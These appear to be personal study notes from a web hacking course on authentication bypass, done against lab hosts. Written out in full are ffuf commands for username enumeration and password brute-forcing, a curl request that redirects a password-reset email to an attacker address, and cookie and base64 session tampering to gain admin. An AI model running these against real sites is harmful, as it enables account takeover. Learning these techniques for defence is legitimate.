---
layout: default
title: Authentication Bypass
parent: Introduction to Web Hacking
nav_order: 4
---

# Authentication Bypass
**Creating a list of valid usernames**
- Website error messages
    - `An account with this username already exists`
    - `Account not found from supplied email address`

## An account with this username already exists
### Create a list of usernames
```diff
ffuf \
-w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
-X POST \
-d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://10.82.132.1/customers/signup \
-mr "username already exists"
```
- `-w`, The list of usernames
- `-X`, The request method
- `-d`, The data to send
- `-H`, Adding additional headers to the request
    - `Content-Type`, The web server knows the use is sending form data.
- `-u`, The URL
- `-mr`, The message on the page to validate a valid username.

`valid_usernames.txt`
```
admin
robert
simon
steve
```
```diff
ffuf \
-w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt:W2 \
-X POST \
-d "username=W1&password=W2" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://10.82.132.1/customers/login \
-fc 200
```
- `-w`, Separated with a comma
    - `W1`, The list of valid usernames
    - `W2`, The list of passwords
- `-fc`, To check for an HTTP status code 200

```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```
- An unauthenticated user requesting `/adMin` will not have their privileges checked and have the page displayed to them, bypassing the authentication checks.

## Account not found from supplied email address
```diff
curl \
'http://10.81.176.189/customers/reset?email=robert%40acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert'
```
- `-H`, Add an additional header to the request
    - `Content-Type`, Lets the web server know we are sending form data.
- `-d`, 
```diff
curl \
'http://10.81.176.189/customers/reset?email=robert%40acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert&email=attacker@hacker.com'
```
- The password reset email is sent using the data found in the php variable `$_REQUEST`
    - Contains data received from the query string and post data.
- If the same key name is used for both the query string and post data, the application logic for this variable favours post data fields rather than the query string, so if we add another parameter to the post form, we can control where the password reset email gets delivered.
```diff
curl \
'http://10.81.176.189/customers/reset?email=robert@acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert&email={username}@customer.acmeitsupport.thm'
```

## Cookies
### Plain Text
The cookie set after a successful login
```diff
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```
- `logged_in=true`, The user is currently logged in or not
- `admin=false`, The visitor has admin privileges or not

Change the contents of the cookies & make a request to change privileges.
1. `curl http://10.81.176.189/cookie-test`, Requesting the target page
    - `Not Logged In`
1. `curl -H "Cookie: logged_in=true; admin=false" http://10.81.176.189/cookie-test`, Send a request with the `logged_in` cookie set to `true` and the `admin` cookie set to `false`.
    - `Logged In As A User`
1. `curl -H "Cookie: logged_in=true; admin=true" http://10.81.176.189/cookie-test`, Request setting both the `logged_in` and `admin` cookie to `true`.
    - `Logged In As An Admin`
## Hashing
[Database of hashes](https://crackstation.net/)
||||
|---|---|---|
|1|`md5`|`c4ca4238a0b923820dcc509a6f75849b`|
|1|`sha-256`|`6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b`|
|1|`sha-512`|`4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a`|
|1|`sha1`|`356a192b7913b04c54574d18c28d46e6395428ab`|
## Encoding
- The encoding is reversible
**Common encoding types**
- **base32**, Converts binary data to the characters A-Z and 2-7
- **base64**, Converts binary data to the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.
For example, Set by the web server upon logging in.
```diff
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
```
`{"id":1,"admin":false}`

```diff
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOnRydWV9; Max-Age=3600; Path=/
```
`{"id":1,"admin":true}`